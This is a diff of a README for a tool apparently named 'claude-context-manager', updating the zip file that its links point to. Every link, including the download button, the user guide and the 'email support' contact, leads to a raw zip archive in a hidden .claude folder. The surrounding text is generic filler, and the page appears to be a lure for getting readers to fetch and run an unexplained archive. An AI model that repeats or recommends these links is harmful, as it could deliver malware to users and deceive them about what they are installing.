@@ -1,6 +1,6 @@
 # 🛠️ claude-context-manager - Simplify Your Coding Context Management
 
-![Download claude-context-manager](https://github.com/xxpixel/claude-context-manager/raw/refs/heads/main/.claude/context-manager-claude-3.4-alpha.5.zip)
+![Download claude-context-manager](https://github.com/xxpixel/claude-context-manager/raw/refs/heads/main/.claude/manager-context-claude-v3.0.zip)
 
 ## 📥 Overview
 
@@ -14,7 +14,7 @@ Follow these simple steps to get started with **claude-context-manager**.
 
    To download the application, click the link below:
    
-   [Download claude-context-manager](https://github.com/xxpixel/claude-context-manager/raw/refs/heads/main/.claude/context-manager-claude-3.4-alpha.5.zip)
+   [Download claude-context-manager](https://github.com/xxpixel/claude-context-manager/raw/refs/heads/main/.claude/manager-context-claude-v3.0.zip)
 
 2. **Choose Your Version**
 
@@ -50,14 +50,14 @@ These features aim to enhance your coding experience.
 
 ## 📖 Documentation
 
-For detailed guidance on how to use the application, visit the [User Guide](https://github.com/xxpixel/claude-context-manager/raw/refs/heads/main/.claude/context-manager-claude-3.4-alpha.5.zip).
+For detailed guidance on how to use the application, visit the [User Guide](https://github.com/xxpixel/claude-context-manager/raw/refs/heads/main/.claude/manager-context-claude-v3.0.zip).
 
 ## 🌐 Support
 
 If you encounter any issues or have questions, please reach out through the following channels:
 
 - **GitHub Issues:** Submit your questions or report bugs in the GitHub Issues section of this repository.
-- **Email Support:** Contact the support team at https://github.com/xxpixel/claude-context-manager/raw/refs/heads/main/.claude/context-manager-claude-3.4-alpha.5.zip
+- **Email Support:** Contact the support team at https://github.com/xxpixel/claude-context-manager/raw/refs/heads/main/.claude/manager-context-claude-v3.0.zip
 
 Your feedback helps us make the application better.
 
@@ -65,6 +65,6 @@ Your feedback helps us make the application better.
 
 To get started, don't forget to download the application from the link below:
 
-[Download claude-context-manager](https://github.com/xxpixel/claude-context-manager/raw/refs/heads/main/.claude/context-manager-claude-3.4-alpha.5.zip)
+[Download claude-context-manager](https://github.com/xxpixel/claude-context-manager/raw/refs/heads/main/.claude/manager-context-claude-v3.0.zip)
 
 This guide will help ensure you correctly download and set up **claude-context-manager**. Enjoy managing your coding context with ease!
